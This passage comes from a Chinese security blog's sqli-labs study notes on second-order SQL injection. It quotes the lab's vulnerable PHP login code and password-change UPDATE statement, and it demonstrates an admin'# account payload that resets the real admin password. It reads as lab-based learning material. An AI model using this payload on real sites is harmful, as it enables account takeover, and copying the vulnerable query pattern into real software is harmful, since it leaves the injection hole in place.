<p>所以只要在一开始将<code>character_set_client</code>的编码设置为二进制，就可使得所有数据是以二进制形式传递，不存在宽字节注入</p>
</blockquote>
<h2 id="0x06-二次注入"><a href="#0x06-二次注入" class="headerlink" title="0x06 二次注入"></a>0x06 二次注入</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>二次注入，就是攻击者第一次向服务端发送请求时会将恶意构造的数据存储到数据库中，然后在第二次进行不同的请求，服务端收到请求后会在数据库中查询处理已经储存的信息，从而导致第一次请求构造的恶意数据（sql语句或命令）在服务端运行</p>
<p>可以概括为两步：</p>
<blockquote>
<p>插入恶意数据</p>
<blockquote>
<p>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据</p>
</blockquote>
<p>引用恶意数据</p>
<blockquote>
<p>数据已经存储在数据库中了，而且已经存储的数据默认是安全的。在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理</p>
</blockquote>
</blockquote>
<p><img src="https://i.loli.net/2021/06/23/ns9UdP3KVTqYG7g.png" alt="img"></p>
<h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>登录界面并不存在注入，先注册一个账号<code>root&#39;#</code>密码为<code>root</code></p>
<p><img src="https://i.loli.net/2021/06/23/D6tzxS47IYdENX2.png" alt="image-20210623193305758"></p>
<p>可见成功注册</p>
<p>login.php</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">function sqllogin()&#123;</span><br><span class="line"></span><br><span class="line">   $username <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_user&quot;]);</span><br><span class="line">   $password <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_password&quot;]);</span><br><span class="line">   $<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">   $res <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>) <span class="keyword">or</span> die(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   $<span class="type">row</span> <span class="operator">=</span> mysql_fetch_row($res);</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r($<span class="type">row</span>) ;</span><br><span class="line">   if ($row[1]) &#123;</span><br><span class="line">			<span class="keyword">return</span> $<span class="type">row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见登录界面的<code>username</code>和<code>password</code>均被<code>mysql_real_escape_string</code>函数进行转义，但是由于转义后加上的反斜杠\并不会被写入数据库中，所以还是可以成功注册<code>root&#39;#</code>账号</p>
<p>使用<code>root&#39;#</code>进行登录</p>
<blockquote>
<p>由于原本的数据库中不存在<code>root</code>的账号，所以注册<code>root&#39;#</code>没有用，还是对二次注入的理解不到位</p>
</blockquote>
<p>这里重新注册一个<code>admin&#39;#</code>的账号，进行登录，将<code>admin&#39;#</code>密码修改为<code>090909</code></p>
<p><img src="https://i.loli.net/2021/06/23/91lu5brfLTc7KJV.png" alt="image-20210623195152806"></p>
<p>结果发现反而是<code>admin</code>的密码被修改了，而<code>admin&#39;#</code>则没有被修改</p>
<p>在<code>pass_change</code>中有这样的sql更新语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>
<p>当使用<code>admin&#39;#</code>进行修改密码时，这里的<code>username=&#39;$username&#39;</code>就会变为<code>username=&#39;admin&#39;#&#39;</code>而<code>#</code>会将后面的单引号注释了，所以就直接变成了<code>admin</code>用户</p>
<p>参考文章：</p>
<p><a href="https://www.anquanke.com/post/id/235970#h3-2">SQL注入漏洞详解</a></p>
<p><a href="https://forum.90sec.com/t/topic/1638">【最全干货】SQL注入大合集</a></p>
<p><a href="https://blog.csdn.net/angry_program/article/details/104309945">Sqli-labs 堆叠注入篇 (Less38~53)</a></p>
<p><a href="https://www.cnblogs.com/0nth3way/articles/7128189.html">SQL注入-堆叠注入（堆查询注入）</a></p>
<p><a href="https://blog.csdn.net/weixin_44604541/article/details/108654206">sqli-labs学习笔记（十一）less 32-37 宽字节注入</a></p>
<p><a href="https://www.jianshu.com/p/3fe7904683ac">SQL注入防御绕过——二次注入</a></p>
<p><a href="https://www.sqlsec.com/2020/10/todo.html">国光的安全随笔记录</a></p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
</search>
